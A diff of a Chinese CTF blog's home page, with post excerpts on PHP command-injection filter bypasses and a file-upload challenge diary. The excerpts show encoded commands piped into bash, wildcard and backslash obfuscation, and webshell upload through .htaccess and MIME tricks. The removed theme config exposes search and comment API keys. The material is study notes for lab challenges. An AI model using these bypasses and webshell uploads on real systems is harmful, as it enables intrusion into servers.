+<li>sort:主要用于排序文件<br><code>?cmd=passthru(&quot;/usr/bin/so?t fl\ag.p\hp&quot;)</code>应对sort被过滤</li>
+<li>uniq：报告或删除文件中重复的行</li>
+<li>file -f:报错出具体内容</li>
+<li>grep：在文本中查找指定的字符串<br><code>grep fl fla*</code> 从fla*文件中搜索包含fla的字符串的行,一般搜索{</li>
+<li>一定记得加分号</li>
+</ol>
+<h2 id="九、编码绕过"><a href="#九、编码绕过" class="headerlink" title="九、编码绕过"></a>九、编码绕过</h2><h3 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h3><p>命令编码后的字符串–绕过过滤—&gt;目标服务器—解码—&gt;执行命令</p>
+<h3 id="1-base64编码"><a href="#1-base64编码" class="headerlink" title="1.base64编码"></a>1.base64编码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">S = <span class="string">b&#x27;cat flag.php&#x27;</span></span><br><span class="line">e64= base64.b64encode(S)</span><br><span class="line"><span class="built_in">print</span>(e64)</span><br></pre></td></tr></table></figure>
+
+<p><code>cat flag.php-&gt;Y2F0lGZsYWcucGhw</code><br><code>echo &quot;Y2F0lGZsYWcucGhw&quot; | base64 -d</code>管道输出符 -d表示decode解码</p>
+<p>让命令执行passthru(‘  1 or 2 or 3  ‘)</p>
+<ol>
+<li><code>echo Y2F0lGZsYWcucGhw | base64 -d | /bin/bash</code> &#x2F;bin&#x2F;bash or bash or sh… </li>
+<li>反引号</li>
+<li>$()</li>
+</ol>
+<h3 id="2-base32"><a href="#2-base32" class="headerlink" title="2.base32"></a>2.base32</h3><p>与base64同</p>
+<h3 id="3-HEX编码-acsii"><a href="#3-HEX编码-acsii" class="headerlink" title="3.HEX编码(acsii)"></a>3.HEX编码(acsii)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binacsii</span><br><span class="line">s = <span class="string">b&quot;tac flag&quot;</span></span><br><span class="line">h= binascii.b2a_hex(s)</span><br><span class="line"><span class="built_in">print</span>(h)</span><br></pre></td></tr></table></figure>
+
+<p><code>tac flag.php-&gt;74616320666c61672e706870</code><br>&#96;&#96;#echo “74616320666c61672e706870” | xxd -r-p | bash&#96;</p>
+<h3 id="4-shellcode编码-16进制机器码"><a href="#4-shellcode编码-16进制机器码" class="headerlink" title="4.shellcode编码(16进制机器码)"></a>4.shellcode编码(16进制机器码)</h3><p>当服务器没装xxd可以用</p>
+<p><code>tac flag.php -&gt;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70</code>也就是把ascii每两个之前加\x</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tag/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="color: #00a596">学习笔记</a>
+        </span>
+        
+    </div>
+    <a href="/article/1615743781/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/article/3439035480/">
+        <h2 class="post-title">4.14文件上传刷题日记</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/4/14
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h2 id="buuctf-是兄弟就来传马"><a href="#buuctf-是兄弟就来传马" class="headerlink" title="buuctf[是兄弟就来传马"></a>buuctf[是兄弟就来传马</h2><p>先传一个php木马</p>
+<p><img src="/../images/0414-1.png"></p>
+<p>页面报错，随便改一个后缀，看看是黑名单还是白名单过滤，这里php代码前加GIF89a绕过图片大小检查</p>
+<p> <img src="/../images/0414-2.png"></p>
+<p>报错，接着试一下是不是MIME过滤</p>
+<p><code>Content-Type: image/png</code></p>
+<p>上传成功 <code>/var/www/html/upload/743be915f2c6ab5de3600d87068cafd2/hack.jpg succesfully uploaded!</code></p>
+<p>接下来修改.htaccess解析文件,记得改Content-type</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;hack&quot;</span> &gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;743be915f2c6ab5de3600d87068cafd2&#x2F;.htaccess succesfully uploaded!</p>
+<p>接着上传hack.jpg图片<code>/var/www/html/upload/743be915f2c6ab5de3600d87068cafd2/hack.jpg succesfully uploaded!</code></p>
+<p>拼接后的url蚁剑链接即可</p>
+<h2 id="ACTF2020-Upload"><a href="#ACTF2020-Upload" class="headerlink" title="ACTF2020 Upload"></a>ACTF2020 Upload</h2><p>尝试上传php，发现前端拦截，上传png,用bp抓包改php，上传失败</p>
+<p>尝试phtml，上传成功</p>
+<p>Upload Success! Look here~ .&#x2F;uplo4d&#x2F;87d8f9288427fb50ed6e8dd6be21e62b.phtml</p>
+<p><a target="_blank" rel="noopener" href="http://b2a5f0cf-75b2-4af3-9386-e4d027a70dc1.node5.buuoj.cn:81/uplo4d/87d8f9288427fb50ed6e8dd6be21e62b.phtml%E8%9A%81%E5%89%91%E9%93%BE%E6%8E%A5%E5%8D%B3%E5%8F%AF">http://b2a5f0cf-75b2-4af3-9386-e4d027a70dc1.node5.buuoj.cn:81/uplo4d/87d8f9288427fb50ed6e8dd6be21e62b.phtml蚁剑链接即可</a></p>
+<p>ps:buu上面的文件上传题都有bug，经常导致重定向</p>
+<h2 id="SWPUCTF-2021-新生赛-easyupload1-0"><a href="#SWPUCTF-2021-新生赛-easyupload1-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload1.0"></a>[SWPUCTF 2021 新生赛]easyupload1.0</h2><p>同样是png文件改phtml，用蚁剑链接只能找到fakeflag，看了wp才知道在phpinfo()中，长知识了</p>
+<h2 id="SWPUCTF-2021-新生赛-easyupload3-0"><a href="#SWPUCTF-2021-新生赛-easyupload3-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload3.0"></a>[SWPUCTF 2021 新生赛]easyupload3.0</h2><p>提示用文件组合，.htaccess秒了(nss平台没bug)</p>
+<h2 id="NISACTF-2022-babyupload复现"><a href="#NISACTF-2022-babyupload复现" class="headerlink" title="[NISACTF 2022]babyupload复现"></a>[NISACTF 2022]babyupload复现</h2><p>上传各种文件，发现一直返回badname，查看源代码，发现source目录，访问后给了Python源码</p>
+<p>代码粘到gpt，发现文件不能带点，根据文件名给一个id，再通过<code>/file/uuid</code>访问文件，通过查询数据库得到对应文件名，在文件名前拼接<code>uploads/</code>后读取该路径下上传的文件。</p>
+<p><code> with open(os.path.join(&quot;uploads/&quot;, res[0]), &quot;r&quot;) as f:        return f.read()</code></p>
+<p>绝对路径拼接漏洞</p>
+<blockquote>
+<p>os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 &#x2F; 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径</p>
+</blockquote>
+<p>直接把文件名字改成&#x2F;flag，访问得到flag</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tag/%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/" style="color: #00a596">刷题日记</a>
+        </span>
+        
+    </div>
+    <a href="/article/3439035480/" class="go-post">阅读全文</a>
+</div>
+
+
+        <div class="page-current">
+    
+    <span class="current">1</span>
+    
+    <a class="page-num" href="/page/2">
+        2
+    </a>
+    
+    
+    <a class="page-num" href="/page/3">
+        3
+    </a>
+    
+    
+    
+    <a class="page-num" href="/page/2/">
+        <i class="fa-solid fa-caret-right fa-fw"></i>
+    </a>
     
 </div>
-<div id="container">
+
+    </div>
     
+    <div id="home-card">
+        <div id="card-style">
+    <div id="card-div">
+        <div class="avatar">
+            <img src="/images/avatar.jpg" alt="avatar" />
+        </div>
+        <div class="name">dyinglight</div>
+        <div class="description">
+            <p>Description<br>…</p>
+
+        </div>
         
-            <!-- 首页 -->
-            <div class="articles">
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/article/2908473467/">ciscn-wp</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2024-05-18
-                            </span>
-                            
-                                
-                                    <span id="/article/2908473467/" class="leancloud_visitors" data-flag-title="ciscn-wp">
-                                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                    </span>
-                                
-                                
-                                    <span>
-                                        <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/article/2908473467/"></span>
-                                    </span>
-                                
-                            
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/article/479963934/">ISCC-wp-dyinglight</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2024-05-01
-                            </span>
-                            
-                                
-                                    <span id="/article/479963934/" class="leancloud_visitors" data-flag-title="ISCC-wp-dyinglight">
-                                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                    </span>
-                                
-                                
-                                    <span>
-                                        <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/article/479963934/"></span>
-                                    </span>
-                                
-                            
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/article/862536289/">SSSCTFwp-Dyinglight</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2024-04-27
-                            </span>
-                            
-                                
-                                    <span id="/article/862536289/" class="leancloud_visitors" data-flag-title="SSSCTFwp-Dyinglight">
-                                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                    </span>
-                                
-                                
-                                    <span>
-                                        <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/article/862536289/"></span>
-                                    </span>
-                                
-                            
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/article/1615743781/">php命令执行</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2024-04-17
-                            </span>
-                            
-                                
-                                    <span id="/article/1615743781/" class="leancloud_visitors" data-flag-title="php命令执行">
-                                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                    </span>
-                                
-                                
-                                    <span>
-                                        <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/article/1615743781/"></span>
-                                    </span>
-                                
-                            
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/article/3439035480/">4.14文件上传刷题日记</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2024-04-14
-                            </span>
-                            
-                                
-                                    <span id="/article/3439035480/" class="leancloud_visitors" data-flag-title="4.14文件上传刷题日记">
-                                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                    </span>
-                                
-                                
-                                    <span>
-                                        <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/article/3439035480/"></span>
-                                    </span>
-                                
-                            
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
+        
+        <div class="friend-links">
+            
+            <div class="friend-link">
+                <a target="_blank" rel="noopener" href="https://argvchs.github.io">Argvchs</a>
             </div>
             
-            
-        
-    <div class="pagination-bottom">
-        <div class="pagination">
-            
-                <a href="/page/2/">下一页</a>
-            
         </div>
+        
     </div>
+</div>
 
+    </div>
     
 </div>
-    <div id="footer">
-    <div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>【人生若只如初见<span><i class='iconfont icon-like-fill'></i></span>何事秋风悲画扇】</div><div>&copy; 2020-2023 WorstOne. All Rights Reserved.</div>
-</div>
-    <div id="sidebar">
-    <div class="menu-wrap" style="display:none;">
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 dyinglight&#39;s blog
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;dyinglight
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
         
-            <div class="menu-notice">
-                <span class="iconfont icon-notice"></span>
-                <div class="notice">
-                    <span>ctf start！</span>
-                </div>
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
             </div>
+        </transition>
         
-        <nav class="menu">
-            <div class="menu-introduce"> 
-                <div class="introduce-avatar">
-                    <img src="/image/sidebar/RL02.jpg">
-                </div> 
-                <div class="introduce-info"> 
-                    <div class="introduce-user">
-                        
-                            <a href="https://worstone.cn" target="_blank"><span>Dyinglight</span></a>
-                        
-                    </div>
-                </div> 
-            </div> 
-            <div class="menu-list">
-                <ul>
-                    
-                        <li class=" active "><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
-                    
-                        <li class=""><a href="/category" class="" target="_self"><span class="iconfont icon-folder-fill"></span>分类</a></li>
-                    
-                        <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
-                    
-                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
-                    
-                        <li class=""><a href="/donate" class="" target="_self"><span class="iconfont icon-heart-fill"></span>赞赏</a></li>
-                    
-                        <li class=""><a href="/about" class="" target="_self"><span class="iconfont icon-about-fill"></span>关于</a></li>
-                    
-                        <li class=""><a href="/atom.xml" class="" target="_blank"><span class="iconfont icon-rss"></span>订阅</a></li>
-                    
-                        <li class=""><a href="javascript:;" class="search" target="_self"><span class="iconfont icon-search-menu"></span>搜索</a></li>
-                    
-                        <li class=""><a href="/comment" class="" target="_self"><span class="iconfont icon-comments-fill"></span>留言板</a></li>
-                    
-                        <li class=""><a href="/friend" class="" target="_self"><span class="iconfont icon-link"></span>友情链接</a></li>
-                    
-                </ul> 
-            </div> 
-            <div class="menu-link">
-                <div class="box">
-                    <div class="image-box"></div>
-                </div>
-                
-                    <a name="知乎" href="https://zhihu.com/people/worstone-29" class="" target="_blank" data=""><span class="iconfont icon-zhihu"></span></a>
-                
-                    <a name="微博" href="https://weibo.com/u/5749847477" class="" target="_blank" data=""><span class="iconfont icon-weibo"></span></a>
-                
-                    <a name="QQ" href="javascript:;" class="image" target="_self" data="/image/sidebar/qq.jpg"><span class="iconfont icon-qq"></span></a>
-                
-                    <a name="微信" href="javascript:;" class="" target="_self" data=""><span class="iconfont icon-wechat"></span></a>
-                
-                    <a name="GitHub" href="https://github.com/Dyinglight5" class="" target="_blank" data=""><span class="iconfont icon-github"></span></a>
-                
-            </div> 
-        </nav>
-        <button class="menu-button-close"></button>
-        <div class="morph-shape" id="morph-shape" data-morph-open="M-7.312,0H15c0,0,66,113.339,66,399.5C81,664.006,15,800,15,800H-7.312V0z;M-7.312,0H100c0,0,0,113.839,0,400c0,264.506,0,400,0,400H-7.312V0z">
-            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none">
-                <path d="M-7.312,0H0c0,0,0,113.839,0,400c0,264.506,0,400,0,400h-7.312V0z"/>
-            </svg>
-        </div>
     </div>
-    <button class="menu-button-open">MENU</button>
-    <div class="menu-cover"></div>
-</div>
-    <link type="text/css" rel="stylesheet" href="/css/search.css">
-<script type="text/javascript" src="/js/iscroll.js"></script>
-<script type="text/javascript" src="/js/instantsearch.min.js"></script>
-<div class="search-window">
-    <div class="search-content">
-        <div class="search-content-icon">
-            <i class="iconfont icon-search"></i>
-        </div>
-        <div id="search-input" class="search-input"></div>
-    </div>
-
-    <div class="search-scroll">
-        <div class="search-result">
-            <div id="search-stats" class="search-stats"></div>
-            <div id="search-hits"></div>
-            <div id="search-pagination" class="search-pagination"></div>
-        </div>
-    </div>
-
-    <span class="search-close-icon">
-        <i class="iconfont icon-close"></i>
-    </span>
-</div>
-    <div id="tools">
-    <div class="progressbar-top"></div>
+    <script src="/js/main.js"></script>
     
-    <link type="text/css" rel="stylesheet" href="/css/APlayer.css">
-    <script type="text/javascript" src="/js/APlayer.min.js"></script>
-    <script type="text/javascript" src="/js/Meting.min.js"></script>
-    <script>
-        var meting_api = 'https://api.i-meto.com/meting/api?server=:server&type=:type&id=:id&auth=:auth&r=:r';
-    </script>
-    <meting-js id="3778678" lrcshow="false" server="netease" type="playlist" fixed="true" autoplay="false" loop="all" order="random" preload="auto" volume="0.67" mutex="true"></meting-js>
-
-    <div class="wrap-right">
-    <div class="wrap-right-hide">
-         <div class="wrap-right-button favorites">
-            <div class="iconbox" switch="false">
-                <span class="iconfont icon-favorites"></span>
-            </div>
-            <span class="icontext">关注</span>
-         </div>
-        <div class="wrap-right-button search">
-            <div class="iconbox">
-                <span class="iconfont icon-search-menu"></span>
-            </div>
-            <span class="icontext">搜索</span>
-        </div>
-        <div class="wrap-right-button menu-button">
-            <div class="iconbox">
-                <span class="iconfont icon-menu"></span>
-            </div>
-            <span class="icontext">菜单</span>
-        </div>
-        <div class="wrap-right-button mode">
-            <div class="light">
-                <div class="iconbox">
-                    <span class="iconfont icon-daymode"></span>
-                </div>
-                <span class="icontext">浅色模式</span>
-            </div>
-            <div class="dark">
-                <div class="iconbox">
-                    <span class="iconfont icon-nightmode-fill"></span>
-                </div>
-                <span class="icontext">深色模式</span>
-            </div>
-        </div>
-        <div class="wrap-right-button bottom">
-            <div class="iconbox">
-                <span class="iconfont icon-top"></span>
-            </div>
-            <span class="icontext">跳至底部</span>
-        </div>
-    </div>
-    <div class="wrap-right-show">
-        <div class="wrap-right-button set">
-            <div class="iconbox">
-                <span class="iconfont icon-setting"></span>
-            </div>
-            <span class="icontext">设置</span>
-        </div>
-        <div class="wrap-right-button top">
-            <div class="iconbox">
-                <span class="iconfont icon-top"></span>
-            </div>
-            <span class="icontext">返回顶部</span>
-        </div>
-    </div>
-</div>
-    <div class="loading"></div>
-</div>
-    <script>
-    window.config = {
-        GitHubUserName     : "Dyinglight5",
-        GitHubRepositories : "Dyinglight5.github.io",
-
-        User             : "Dyinglight",
-        UserAvatar       : "/image/sidebar/RL02.jpg",
-        WebsiteStartDate : "2024-03-24",
-        Home             : "https://worstone.cn",
-
-        WebsiteTitleBlur         : "(◍´꒳`◍) Hi, Live For Code",
-        WebsiteTitleBlurTimeOut  : 500,
-        WebsiteTitleFocus        : "(*´∇｀*) 欢迎回来!",
-        WebsiteTitleFocusTimeOut : 1000,
-        WebsiteFavicon           : {
-            light : "/image/website/logo/logo.png",
-            dark  : "/image/website/logo/logo-dark.png"
-        },
-
-        ProgressBar : {
-            id       : "topProgressBar",
-            color    : "#77B6FF",
-            height   : "2px",
-            duration : 0.2
-        },
-
-        Loading: {
-            rebound : {
-                tension  : 16,
-                friction : 5
-            },
-            spinner : {
-                id     : "spinner",
-                radius : 90,
-                sides  : 3,
-                depth  : 4,
-                colors : {
-                    background : "#F0F0F0",
-                    stroke     : "#272633",
-                    base       : "",
-                    child      : "#272633"
-                },
-                alwaysForward : true,
-                restAt        : 0.5,
-                renderBase    : false
-            }
-        },
-
-        HomeHeaderAnimationRendered : true,
-        HomeHeaderAnimation         : {
-            radius      : 15,
-            density     : 0.2,
-            color       : "rgba(255, 255, 255, .2)",
-            clearOffset : 0.3
-        },
-
-        BackAnimationRendered          : true,
-        IEBrowserBackAnimationRendered : false,
-        BackAnimation                  : {
-            colorSaturation  : "60%",
-            colorBrightness  : "50%",
-            colorAlpha       : 0.5,
-            colorCycleSpeed  : 5,
-            verticalPosition : "random",
-            horizontalSpeed  : 200,
-            ribbonCount      : 3,
-            strokeSize       : 0,
-            parallaxAmount   : -0.2,
-            animateSections  : true
-        },
-
-        HomeHeaderImage : [
-            
-                "/image/header/elysia2.jpg",
-            
-                "/image/header/kiana1.png",
-            
-                "/image/header/home.jpeg",
-            
-        ],
-        HomeBannerText  : "",
-
-        ArticleHeaderImage : [
-            
-                "/image/header/article.jpg",
-            
-                "/image/header/home.jpeg",
-            
-        ],
-
-        OtherBannerText : "",
-
-        Error : {
-            icon    : "icon-swimming",
-            title   : "PAGE NOT FOUND",
-            content : [
-                
-                    "很抱歉，您访问的页面不存在！",
-                
-                    "可能是输入地址有误或该地址已变更。",
-                
-            ],
-            buttons : [
-                
-                    {
-                        icon  : "icon-home",
-                        text  : "返回首页",
-                        href  : "/",
-                        class : ""
-                    },
-                
-            ]
-        },
-
-        MenuNotice : {
-            enable : true,
-            notice : "ctf start！",
-            speed  : 20
-        },
-        MenuList : [
-            
-                {
-                    name   : "首页",
-                    icon   : "icon-home-fill",
-                    href   : "/",
-                    type   : "index",
-                    class  : "",
-                    target : "_self"
-                },
-            
-                {
-                    name   : "分类",
-                    icon   : "icon-folder-fill",
-                    href   : "/category",
-                    type   : "category",
-                    class  : "",
-                    target : "_self"
-                },
-            
-                {
-                    name   : "标签",
-                    icon   : "icon-discount-fill",
-                    href   : "/tag",
-                    type   : "tag",
-                    class  : "",
-                    target : "_self"
-                },
-            
-                {
-                    name   : "归档",
-                    icon   : "icon-calendar-fill",
-                    href   : "/archive",
-                    type   : "archive",
-                    class  : "",
-                    target : "_self"
-                },
-            
-                {
-                    name   : "赞赏",
-                    icon   : "icon-heart-fill",
-                    href   : "/donate",
-                    type   : "donate",
-                    class  : "",
-                    target : "_self"
-                },
-            
-                {
-                    name   : "关于",
-                    icon   : "icon-about-fill",
-                    href   : "/about",
-                    type   : "about",
-                    class  : "",
-                    target : "_self"
-                },
-            
-                {
-                    name   : "订阅",
-                    icon   : "icon-rss",
-                    href   : "/atom.xml",
-                    type   : "",
-                    class  : "",
-                    target : "_blank"
-                },
-            
-                {
-                    name   : "搜索",
-                    icon   : "icon-search-menu",
-                    href   : "javascript:;",
-                    type   : "",
-                    class  : "search",
-                    target : "_self"
-                },
-            
-                {
-                    name   : "留言板",
-                    icon   : "icon-comments-fill",
-                    href   : "/comment",
-                    type   : "comment",
-                    class  : "",
-                    target : "_self"
-                },
-            
-                {
-                    name   : "友情链接",
-                    icon   : "icon-link",
-                    href   : "/friend",
-                    type   : "friend",
-                    class  : "",
-                    target : "_self"
-                },
-            
-        ],
-        MenuLink : [
-            
-                
-                    {
-                        name   : "知乎",
-                        icon   : "icon-zhihu",
-                        href   : "https://zhihu.com/people/worstone-29",
-                        class  : "",
-                        target : "_blank",
-                        image  : ""
-                    },
-                
-                    {
-                        name   : "微博",
-                        icon   : "icon-weibo",
-                        href   : "https://weibo.com/u/5749847477",
-                        class  : "",
-                        target : "_blank",
-                        image  : ""
-                    },
-                
-                    {
-                        name   : "QQ",
-                        icon   : "icon-qq",
-                        href   : "javascript:;",
-                        class  : "image",
-                        target : "_self",
-                        image  : "/image/sidebar/qq.jpg"
-                    },
-                
-                    {
-                        name   : "微信",
-                        icon   : "icon-wechat",
-                        href   : "javascript:;",
-                        class  : "",
-                        target : "_self",
-                        image  : ""
-                    },
-                
-                    {
-                        name   : "GitHub",
-                        icon   : "icon-github",
-                        href   : "https://github.com/Dyinglight5",
-                        class  : "",
-                        target : "_blank",
-                        image  : ""
-                    },
-                
-            
-        ],
-
-        FooterStyle : 2,
-        BottomText  : "<div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>【人生若只如初见<span><i class='iconfont icon-like-fill'></i></span>何事秋风悲画扇】</div><div>&copy; 2020-2023 WorstOne. All Rights Reserved.</div>",
-
-        ConsoleList : [
-            
-                
-                    [
-                        
-                            
-                                "Based on cnblogs theme SimpleMemory.",
-                            
-                                "",
-                            
-                        
-                    ],
-                
-                    [
-                        
-                            
-                                "SimpleMemory Author:",
-                            
-                                "BNDong",
-                            
-                        
-                    ],
-                
-                    [
-                        
-                            
-                                "Theme:",
-                            
-                                "LiveForCode",
-                            
-                        
-                    ],
-                
-            
-        ],
-
-        FontIconExtend : "",
-
-        Donate : {
-            paypal  : "",
-            bitcoin : "",
-            alipay  : "/image/donate/alipay.jpg",
-            wechat  : "/image/donate/wechatpay.jpg"
-        },
-
-        Search : {
-            applicationID : "010C3EANT8",
-            apiKey        : "c7abab9f11b79102b9aff7fe6d41447d",
-            indexName     : "Notes",
-            hits          : {
-                page : 10
-            },
-            labels        : {
-                placeholder : "搜索",
-                empty       : "未发现与 「${query}」 相关的内容",
-                stats       : "${hits} 条相关条目，使用了 ${time} 毫秒",
-            }
-        }, 
-
-        Comment : {
-            switch : true,
-            type   : "Valine",
-        },
-
-        Waline : {
-            el              : ".comments-content",
-            serverURL       : "",
-            path            : window.location.pathname,
-            meta            : "['nick', 'mail', 'link']",
-            requiredMeta    : "['nick', 'mail']",
-            pageSize        : 10,
-            lang            : "zh-cn",
-            locale: {
-                admin       : "博主",
-                anonymous   : "匿名用户",
-                sofa        : "快来做第一个评论的人吧 ~",
-                placeholder : "你是我一生只会遇见一次的惊喜...",
-            },
-            dark            : "html[color-scheme='dark']",
-            search          : false,
-            pageview        : true,
-            comment         : true,
-            copyright       : false,
-        },
-
-        Valine : {
-            el             : ".comments-content",
-            appId          : "SVxN9Sk9mzBk4tCi9470dhDQ-gzGzoHsz",
-            appKey         : "BWGcit0aZ9zv8JeQWBB0eb2s",
-            serverURLs     : "",
-            placeholder    : "你是我一生只会遇见一次的惊喜...",
-            avatar         : "mm",
-            meta           : "nick,mail,link",
-            requiredFields : "nick,mail",
-            pageSize       : 5,
-            lang           : "zh-cn",
-            visitor        : true,
-            enableQQ       : true
-        },
-
-        Tocbot : {
-            switch                : true,
-            tocSelector           : ".toc",
-            contentSelector       : ".article-body",
-            headingSelector       : "h1, h2, h3, h4, h5",
-            headingsOffset        : 0,
-            scrollSmooth          : true,
-            scrollSmoothOffset    : -5,
-            positionFixedSelector : ".toc",
-            positionFixedClass    : "toc-fixed",
-            fixedSidebarOffset    : "",
-        },
-
-        Require : {
-            baseUrl     : "/js/",
-            waitSeconds : 100
-        },
-
-        Music : {
-            type : "Meting"
-        },
-        APlayer : {
-            container : ".aplayer",
-            fixed     : true,
-            autoplay  : false,
-            loop      : "all",
-            order     : "random",
-            preload   : "auto",
-            volume    : 0.67,
-            mutex     : true,
-            lrcType   : 3,
-            audio     : [
-                
-                    {
-                        name   : "Endless Tears",
-                        artist : "CLIFF EDGE",
-                        cover  : "/music/cover/Endless Tears.jpg",
-                        url    : "/music/song/Endless Tears.mp3",
-                        lrc    : "/music/lrc/Endless Tears.lrc"
-                    },
-                
-            ]
-        },
-        Meting : {
-            api      : "https://api.i-meto.com/meting/api",
-            id       : "3778678", 
-            lrcshow  : false, 
-            server   : "netease", 
-            type     : "playlist", 
-            fixed    : true, 
-            autoplay : false, 
-            loop     : "all", 
-            order    : "random", 
-            preload  : "auto", 
-            volume   : 0.67, 
-            mutex    : true
-        },
-
-        Mouse : {
-            enable  : true,
-            options : {
-                size  : 6,
-                sizeF : 24
-            }
-        },
-
-        LazyLoad : {
-            default : "/image/website/lazyload.svg"
-        },
-  
-        Style : {
-            aplayer          : "/css/APlayer.css",
-            archive          : "/css/archive.css",
-            base             : "/css/base.css",
-            clipboard        : "/css/clipboard.css",
-            code             : "/css/code.css",
-            donate           : "/css/donate.css",
-            fancybox         : "/css/jquery.fancybox.css",
-            footer           : "/css/footer.css",
-            iconfont         : "/iconfont/iconfont.css",
-            index            : "/css/index.css",
-            menuBubble       : "/css/menu-bubble.css",
-            mouse            : "/css/mouse.css",
-            page             : "/css/page.css",
-            post             : "/css/post.css",
-            search           : "/css/search.css",
-            tocbot           : "/css/tocbot.css",
-            valine           : "/css/valine.css",
-            waline           : "/css/waline.css",
-            walineCustom     : "/css/waline-custom.css"
-        },
-
-        Script: {
-            aplayer          : "/js/APlayer.min.js",
-            config           : "/js/require.config.js",
-            index            : "/js/index.js",
-            instantSearch    : "/js/instantsearch.min.js",
-            iscroll          : "/js/iscroll.js",
-            jQuery           : "/js/jquery-3.4.1.min.js",
-            loading          : "/js/loading.js",
-            meting           : "/js/Meting.min.js",
-            require          : "/js/require.min.js",
-            waline           : "/js/waline.mjs",
-            pageview         : "/js/pageview.mjs",
-            comment          : "/js/comment.mjs",
-        },
-
-        Font: {
